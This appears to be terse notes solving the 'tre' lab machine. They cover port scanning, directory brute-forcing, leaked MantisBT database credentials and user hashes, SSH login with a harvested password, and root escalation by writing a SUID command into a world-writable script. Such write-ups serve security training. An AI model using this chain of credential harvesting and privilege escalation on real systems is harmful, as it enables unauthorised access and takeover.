----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# tre
# 27/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
8082/tcp open  http    nginx 1.14.2


----------------------------------------------------
# dir bruteforce
----------------------------------------------------
dirb http://192.168.110.84/ /usr/share/wordlists/dirb/big.txt
/cms                  (Status: 301) [Size: 314] [--> http://192.168.110.84/cms/]
http://192.168.110.84/adminer.php
http://192.168.110.84/mantisbt/config
http://192.168.110.84/mantisbt/config/a.txt

----------------------------------------------------
# --- Database Configuration ---
----------------------------------------------------
$g_hostname      = 'localhost';
$g_db_username   = 'mantissuser';
$g_db_password   = 'password@123AS';
$g_database_name = 'mantis';
$g_db_type       = 'mysqli';

----------------------------------------------------
# sql
----------------------------------------------------
select * from 	mantis_user_table;
id	username	realname	email	password	enabled	protected	access_level	login_count	lost_password_request_count	failed_login_count	cookie_string	last_visit	date_created
1	administrator	XiBejMub	root@localhost	3492f8fe2cb409e387ddb0521c999c38	1	0	90	30	0	0	OHysKA8CiRbsM1LW0ZoWIF0gP6EGOwJovGZvGgJfDHkrPmaf2Y7qOVecYBxXDCri	1589342138	1
2	tre	Tr3@123456A!	tre@localhost	64c4685f8da5c2225de7890c1bad0d7f	1	0	70	0	0	0	bp9uP3SY4tyKMFHSytb2RyecV5fPrsvGjb4sLboLkoyodEPn0NbZID9GhRURGAvf	1589263108	1589263108

----------------------------------------------------
# exploit
----------------------------------------------------
ssh tre@192.168.1.104
Password: Tr3@123456A!

----------------------------------------------------
# priv esc
----------------------------------------------------
->ps aux
/usr/bin/check-system

->ls -la /usr/bin/check-system
-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system

->nano /usr/bin/check-system
chmod +s /usr/bin/nano

->sudo shutdown -r now

on kali
openssl passwd -1 -salt user3 pass123

